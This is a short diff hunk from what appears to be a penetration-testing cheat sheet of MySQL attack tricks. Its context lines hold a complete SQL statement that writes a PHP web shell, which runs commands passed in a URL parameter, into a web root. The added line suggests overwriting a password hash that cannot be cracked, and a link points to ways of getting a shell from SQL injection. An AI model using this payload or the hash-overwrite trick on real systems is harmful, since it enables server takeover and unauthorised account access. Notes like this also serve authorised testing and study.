@@ -12,6 +12,8 @@ root : 'root'
 #Insert php shell.
 SELECT '<?php exec($_GET[''cmd'']); ?>' FROM mytable INTO dumpfile ‘/var/www/html/shell.php’
 
+#If you can't crack the hash inside, try updating the hash instead.
+
 #More tricks to priv esc or get shell.
 https://security.stackexchange.com/questions/6919/leveraging-a-shell-from-sql-injection
 ```
